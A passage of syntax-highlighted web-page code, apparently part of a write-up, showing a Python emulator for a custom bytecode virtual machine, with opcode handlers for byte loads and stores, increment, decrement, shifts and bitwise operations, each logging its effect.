</span></span><span class=line><span class=cl>        <span class=c1># 0x1B: byte[mem[base0 + (u16)R[src]]] = (u8)R[dst]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1B</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;STB [base0 + (u16)R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> = R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2>.lo (0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1C: R[reg]++ ; ZF = (old == -1)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1C</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1C&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;INC R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1D: R[reg]-- ; ZF = (old == 1)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1D</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1D&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;DEC R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1E: R[reg] &gt;&gt;= shift8 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1E</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>shift</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1E&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SHR R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> &gt;&gt;= </span><span class=si>{</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=n>res</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1F: base0 += (u16)R[reg]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1F</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1F&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>base0</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ADD base0 += (u16)R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x25: AND 寄存器</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x25</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x25&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>&amp;</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AND R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> &amp;= R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> &amp; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x26: XOR 寄存器</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x26</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x26&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>^</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=n>old</span><span class=p>)</span>  <span class=c1># 等价于 src == 0</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;XOR R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> ^= R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> ^ 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x27: R[reg] &lt;&lt;= shift8 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x27</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>shift</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x27&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SHL R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> &lt;&lt;= </span><span class=si>{</span><span class=n>shift</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=n>res</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x29: R[reg] ^= imm64 ; ZF = (old == imm)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x29</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x29&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>^</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;XOR R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> ^= imm64 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2A: R[reg] &amp;= imm64 ; ZF = (result == 0)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2A</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x2A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>old</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>old</span> <span class=o>&amp;</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AND R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> &amp;= imm64 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>: 0x</span><span class=si>{</span><span class=n>old</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2B: R[dst] = byte[mem[base1 + (u16)R[src]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2B</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x2B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDB R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> = [base1 + (u16)R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x2C: byte[mem[base1 + (u16)R[src]]] = (u8)R[dst]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x2C</span><span class=p>:</span>
